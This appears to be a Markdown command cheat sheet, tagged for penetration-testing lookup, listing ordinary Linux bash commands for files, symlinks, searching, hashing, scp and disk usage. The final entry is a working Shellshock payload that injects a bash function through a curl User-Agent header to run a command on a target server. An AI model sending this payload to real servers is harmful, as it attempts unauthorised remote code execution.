# linux bash

% shell, linux

#plateform/linux #target/local #cat/UTILS #cat/PRIVESC #cat/RECON 

## Re-call last input with sudo
```
sudo !!
```

## Help
```
help cd / help dir (...)
```

## Finding Help
```
apropos directory / apropos search (...)
```

## Define custom startup screen
```
sudo nano /etc/motd
```

## Run a script as background process
```
<process> &
```

## show process command
```
ps -ef | grep apache | grep -v grep
```

## Change group
```
chgrp <group-name-from> <group-name-to>
```

## List directory contents by size
```
ls -Slrh
```

## List all directory contents sorted by time edited reverse
```
ls -altr
```

## List all files of type
```
find . -name *.<txt> -print
```

## Create symlink
```
ln -s <source-dirname> <destination-dirname>
```

## Update symlink
```
ln -sfn <source-dirname> <destination-dirname>
```

## Remove symlink
```
unlink <sample-dirname>
```

## Make (empty) file
```
touch <filename-txt>
```

## Copy/Page folder with content
```
cp -a <old-folder>/ <new-folder>
```

## Move/Rename file
```
mv <current-filename-path> <new-filename-path>
```

## Move/Rename file and prompt before overwriting an existing file
```
mv -i <current-filename> <new-filename>
```

## Search for a string inside all files in the current directory and subdrectories
```
grep -r <string> *
```

## Search and replace within file
```
sed -i s/<original-text>/<new-text>/g <filename-txt>
```

## MD5 hash for files
```
md5sum <filename-txt>
```

## MD5 hash for folders
```
tar c <folder> | md5sum
```

## Encrypt file
```
openssl enc -aes-256-cbc -e -in <sample-filename-txt> -out <sample-encrypted-txt>
```

## Decrypt file
```
openssl enc -aes-256-cbc -d -in <sample-encrypted> -out <sample-filename>
```

## Access via ssh
```
<username-remote>@<ip>
```

## Copy file from server to local
```
scp <username-remote>@<ip>:<file-to-send-path> <path-to-recieve> 
```

## Copy file from local to server
```
scp <file-to-send> <username-remote>@<ip>:<where-to-put>
```

## Escape files with spaces in name like this
```
<path-to-file>\\\ <name-png>
```

## Show disc space
```
df -h
```

## Show disc space (inodes)
```
df -i
```

## Show disc space for current directory
```
du -hs
```

## Current processes (also CPS usage)
```
top or htop
```

## Monitor error log (stream as file grows)
```
tail error.log -f -n 0
```

## Start application
```
xdg-open <programme> 
```

## Register variable
```
export <TESTING>=<Variable-text>
```

## Unset variable
```
unset <Variable>
```

## Append content from a file to another file
```
cat <file1-txt> >> <file2-txt>
```

## Add the amount of lines, words, and characters to file2-txt
```
cat <file1-txt> | <word-count> | cat > <file2-txt>
```

## Sort the content of a file (like cat)
```
sort <hello-txt>
```

## Save to sorted content to a new file
```
cat <file1-txt> | sort > <sorted-file1-txt>
```

## Sort and remove duplicates and save to a new file
```
sort <file1-txt> | uniq > <uniq-file1-txt>
```

## shellshock
```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" <url>
```
